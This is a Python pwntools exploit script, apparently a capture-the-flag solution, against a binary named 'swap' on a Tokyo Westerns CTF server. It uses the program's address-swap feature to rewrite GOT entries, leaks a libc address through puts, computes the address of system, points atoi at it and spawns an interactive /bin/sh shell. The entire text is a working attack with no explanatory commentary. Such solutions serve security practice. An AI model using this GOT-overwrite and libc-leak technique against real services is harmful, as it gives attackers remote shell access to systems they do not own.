from pwn import *
from pwnlib.tubes import *
from pwnlib.util.packing import *
from pwnlib.tubes.process import *
from pwnlib.tubes.remote import *
import struct
import time
def getConn(local):
    return process('./swap', env = {"LD_PRELOAD":"./libc.so.6"}) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)
def send(s):
    print s
    r.sendline(s)
def swap(address1, address2):
    print r.recvuntil('Your choice: \n')
    send('1')
    print r.recvuntil('Please input 1st addr')
    send(str(address1))
    print r.recvuntil('Please input 2nd addr')
    send(str(address2))
    print r.recvuntil('Your choice: \n')
    send('2')
local = False
binary = ELF ( './swap' )
libc = ELF('./libc.so.6')
PUTSPLT = binary.plt['puts']
ATOIGOT = binary.got['atoi']
PUTSGOT =  binary.got['puts']
READGOT =  binary.got['read']
MEMCOPYGOT = binary.got['memcpy']
r = getConn(local)
swap(MEMCOPYGOT,READGOT)
swap(0,ATOIGOT)
r.send(p64(PUTSPLT))
print r.recvuntil('choice: \n')
r.send("B")
h = u64(r.recv(6).ljust(8, '\x00'))
print "STACK ADDRESS 0x%x"%h
addr = h-0x3802b1- libc.symbols['system']
LIBCBASE = addr
SYSTEM = LIBCBASE + libc.symbols['system']
#print r.recv(1024)
log.info("LIBC 0x%x" % LIBCBASE)
log.info("SYSTEM 0x%x" % SYSTEM)
r.send('a\x00')
print r.recvuntil('choice: \n')
r.send(p64(SYSTEM))
print r.recvuntil('choice: \n')
r.send('/bin/sh\x00')
r.interactive()
r.close()
